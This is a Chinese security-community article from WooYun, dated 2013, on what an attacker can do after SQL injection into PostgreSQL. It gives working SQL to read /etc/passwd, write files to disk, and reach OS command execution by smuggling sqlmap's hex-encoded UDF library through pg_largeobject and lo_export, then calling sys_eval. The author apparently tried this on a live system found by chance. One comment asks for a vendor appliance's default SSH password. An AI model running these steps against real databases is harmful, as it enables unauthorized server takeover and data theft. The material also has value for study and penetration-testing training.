<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PostgreSQL的那点事儿</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">疯狗</a> <span class="bull">·</span> <time title="2013/07/09 16:52" ui-time="" datetime="2013/07/09 16:52" class="published ng-binding ng-isolate-scope">2013/07/09 16:52</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>今天无意发现了个PostgreSQL环境，线上学习了下，一般的数据注射（读写数据库）差异不大，不做讨论，个人比较关心PostgreSQL的文件读取和命令执行方面。</p><h3>0x00 文件读取/写入</h3><hr><p>PostgreSQL 8.1 以后提供了一组现成的文件操作函数</p><pre><code>pg_logdir_ls()、pg_ls_dir()、pg_file_rename()、pg_file_write()、 pg_read_file()、pg_length_file()
</code></pre><p>用这些就可以胡作非为了？你错了。。。</p><p>可以用这个函数直接读取/etc/passwd？实际情况下测试并未成功，因为pg_xxx这个adminpack将权限限制在了./postgresql/data下面。</p><h4>a）比如列目录</h4><p><img alt="2013070916495021606.png" img-src="434ea2052b00ecb550bcdb6e01c34526fe4ab1db.jpg"></p><h4>b）读取权限允许的文件</h4><p><img alt="2013070916501626793.png" img-src="394da8bb42d4bcfeeac15f3db64c3490ec9fc766.jpg"></p><p>还有个写文件函数测试并未成功，而且只能像data下写也是满足不了需求的。</p><h4>c）比较可行的文件读取方案</h4><p><img alt="2013070916503429269.png" img-src="d31ec6226adc5aea907d27cc2fadff7b2a7b14e1.jpg"></p><p><img alt="2013070916510067232.png" img-src="147e6707af1e3306adb68291f99174905aa2f38f.jpg"></p><pre><code>drop table wooyun;
CREATE TABLE wooyun(t TEXT);
COPY wooyun FROM '/etc/passwd';
SELECT * FROM wooyun limit 1 offset 0; 
</code></pre><p>利用注射修改偏移值很快就可以遍历出来了，但是还是有点寒碜，直接读出全部数据</p><pre><code>DROP TABLE wooyun;
CREATE TABLE wooyun (t TEXT);
COPY wooyun(t) FROM '/etc/passwd';
SELECT * FROM wooyun;
</code></pre><p><img alt="2013070916512953973.png" img-src="99202a69bfc7b6dc39d54c3e60d7f096dc09b41e.jpg"></p><h4>d）写入文件</h4><pre><code>DROP TABLE wooyun;
CREATE TABLE wooyun (t TEXT);
INSERT INTO wooyun(t) VALUES ('hello wooyun');
COPY wooyun(t) TO '/tmp/wooyun';
</code></pre><p><img alt="2013070916514499642.png" img-src="8d742c4c1896bd55ee7b54ad8e90ea88917b469b.jpg"></p><p>读一下看看是否存在</p><p><img alt="2013070916515914176.png" img-src="f1a2e9e2911b9f40031492e4a7f7c0e116ee22b3.jpg"><br>Bingo~</p><h3>0x01 命令执行</h3><pre><code>enter code here
</code></pre><p>这里大概有三种方式</p><h4>a）利用 libc 中的 system() 函数</h4><p>很多文件会让我们添加一个到libc库的自定义功能函数</p><pre><code>CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT; 
</code></pre><p>但是返回错误</p><pre><code>Error : ERROR:  incompatible library "/lib64/libc.so.6": missing magic block  
HINT:  Extension libraries are required to use the PG\_MODULE\_MAGIC macro.
</code></pre><p>这是因为当PostgreSQL加载外部动态库的时候，会检查MAGIC DATA，如果没有这个函数（Pg&#95;magic&#95;func），PostgreSQL认为这个动态库不是PostgreSQL可以使用的动态库。具体逻辑请看 src/backend/utils/fmgr/dfmgr.c 中定义的 internal&#95;load&#95;library 函数源代码。</p><p>这样一来就等同于建立了一个“白名单”，系统自带的库默认我不再允许动态加载，所以此路不通（也许低版本走的通，但我手里这个不行）。</p><p>给一个 Pg&#95;magic&#95;func 代码样例：</p><pre><code>extern PGDLLEXPORT const Pg_magic_struct * Pg_magic_func(void);
const Pg_magic_struct * 
Pg_magic_func(void)
{
    static const Pg_magic_struct Pg_magic_data = PG_MODULE_MAGIC_DATA;
    return &amp;Pg_magic_data;
} 
</code></pre><h4>b）利用Perl/Python脚本语言功能</h4><p>在zone上看过一帖，http://zone.wooyun.org/content/1591，很纳闷为什么这样定义函数就可以执行系统命令，plperlu又是啥，经过资料的挖掘，发现是PostgreSQL自带的一种程序语言支持。</p><p>具体可见这里（<a href="http://www.postgresql.org/docs/8.3/static/xplang.html">http://www.postgresql.org/docs/8.3/static/xplang.html</a>）。</p><p>大概意思就是PostgreSQL允许用除了SQL和C的其他语言来编写函数，但这个很悲剧啊，我的环境没有安装PostgreSQL的Python和Perl支持，待我弄个环境在来实现下过程。</p><h4>c）利用C语言自定义函数</h4><p>Perl、Python都能在PostgreSQL自定义了更不用说C了。</p><p>这个在sqlmap的udf目录下有现成的，而且还是根据版本加了Pg&#95;magic&#95;func函数的，可以加载。。。牛鞭！</p><pre><code>FengGou:8.4 $ pwd
/Users/FengGou/sqlmap/udf/postgresql/linux/64/8.4
FengGou:8.4 $ ls
lib_postgresqludf_sys.so
</code></pre><p>将sqlmap的so文件转为16进制的代码</p><pre><code>7F454C4602010100000000000000000003003E0001000000C00C0000000000004000000000000000A0170000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000008413000000000000841300000000000000002000000000000100000006000000881300000000000088132000000000008813200000000000A802000000000000B00200000000000000002000000000000200000006000000B013000000000000B013200000000000B01... ...
</code></pre><p>老他么长的一段，怎么还原成二进制的so库文件呢？</p><p>这里感谢 @瞌睡龙 提供的Tips，这里用到了PostgreSQL的pg&#95;largeobject“大对象数据”，官方原文：</p><pre><code>pg_largeobject 表保存那些标记着"大对象"的数据。
一个大对象是使用其创建时分配的 OID 标识的。 
每个大对象都分解成足够小的小段或者"页面"以便以行的形式存储在 pg_largeobject 里。 
每页的数据定义为LOBLKSIZE(目前是BLCKSZ/4，或者通常是 2K 字节)。
</code></pre><p>a）查看PostgreSQL目录</p><pre><code>SELECT setting FROM pg_settings WHERE name='data_directory'; 
</code></pre><p>b）查询id</p><pre><code>select lo_creat(-1);
</code></pre><p>oid为当前对象大数据的标识符，我们要利用这个存储UDF文件内容。</p><p>c）oid与上面保持一致</p><pre><code>delete from pg_largeobject where loid=18412;
</code></pre><p>等于变相清空"页面"，不要干扰库的生成</p><p>d）把16进制的so文件塞进去</p><pre><code>insert into pg_largeobject (loid,pageno,data) values(18412, 0, decode('7F454CXXXXXXXXX000', 'hex'));
</code></pre><p>e）利用PostgreSQL自带函数将大型对象导出到文件</p><pre><code>SELECT lo_export(18412, 'cmd.so'); 
</code></pre><p>f）建立UDF</p><pre><code>CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
</code></pre><p>g）调用这个UDF</p><pre><code>select sys_eval('id'); 
</code></pre><p><img alt="2013070916522426778.jpg" img-src="37792dbd9ccda5bb8a4e52007dace0ebef1c23db.jpg"></p><p>也许服务器没装PostgreSQL的Perl、Python支持，但是C库是通用的。</p><p>参考：<br><a href="static/drops/full/434ea2052b00ecb550bcdb6e01c34526fe4ab1db.jpg">1</a>PostgreSQL SQL Injection Cheat Sheet<br>http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet<br><a href="static/drops/full/394da8bb42d4bcfeeac15f3db64c3490ec9fc766.jpg">2</a>OWASP Backend Security Project Testing PostgreSQL<br>https://www.owasp.org/index.php/OWASP&#95;Backend&#95;Security&#95;Project&#95;Testing_PostgreSQL<br><a href="static/drops/full/d31ec6226adc5aea907d27cc2fadff7b2a7b14e1.jpg">3</a>PostGreSQL注入学习(续篇)<br>http://www.hackol.com/news/201007270731289820885.shtml<br><a href="static/drops/full/147e6707af1e3306adb68291f99174905aa2f38f.jpg">4</a>PostgreSQL Adminpack<br>http://www.postgresql.org/docs/8.4/static/adminpack.html<br><a href="static/drops/full/99202a69bfc7b6dc39d54c3e60d7f096dc09b41e.jpg">5</a>PostgreSQL 外部动态连接库魔法块的使用<br>http://my.oschina.net/quanzl/blog/136907<br><a href="static/drops/full/8d742c4c1896bd55ee7b54ad8e90ea88917b469b.jpg">6</a>Chapter 37. Procedural Languages<br>http://www.postgresql.org/docs/8.3/static/xplang.html<br><a href="static/drops/full/f1a2e9e2911b9f40031492e4a7f7c0e116ee22b3.jpg">7</a>postgresql "初级"注入大法<br>http://zone.wooyun.org/content/1591<br><a href="http://www.postgresql.org/docs/8.3/static/xplang.html">8</a>pg_largeobject<br>http://www.php100.com/manual/PostgreSQL8/catalog-pg-largeobject.html</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vig0r</span> <span class="reply-time">2015-01-19 20:49:36</span></div><p></p><p>4008823823</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">U神</span> <span class="reply-time">2014-11-14 12:04:14</span></div><p></p><p>@疯狗 深信服ssh内置一个用户名叫kfc，他的默认密码是多少</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">F4K3R</span> <span class="reply-time">2014-07-08 01:45:20</span></div><p></p><p>赞！感谢分享～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2013-07-11 11:04:17</span></div><p></p><p>嗯，昨天在zone刚看过。</p><p></p></div></div></div></div></div></main>